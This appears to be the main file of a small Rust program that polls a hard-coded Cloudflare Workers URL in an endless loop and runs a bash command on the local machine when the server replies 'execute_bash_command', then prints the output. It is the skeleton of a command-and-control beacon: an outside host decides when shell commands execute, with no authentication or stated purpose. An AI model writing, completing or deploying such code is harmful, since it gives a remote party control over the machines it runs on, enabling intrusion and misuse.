mod command_executor;  
mod worker_communication;  
  
#[tokio::main]  
async fn main() {  
    let worker_url = "https://serverworker.adoba.workers.dev/";  
  
    loop {  
        // Send data to the Worker  
        let response = match worker_communication::send_data_request(&worker_url, "Sample data").await {  
            Ok(response) => response,  
            Err(e) => {  
                println!("Error: {}", e);  
                continue;  
            }  
        };  
  
        // Check the response from the Worker  
        let output = if response == "execute_bash_command" {  
            command_executor::execute_bash_command(true)  
        } else {  
            command_executor::execute_bash_command(false)  
        };  
  
        if let Some(output) = output {  
            let output_str = String::from_utf8(output.stdout).unwrap();  
            println!("Command output: {}", output_str);  
        }  
  
        // Add more conditions or logic to handle different commands  
    }  
}  
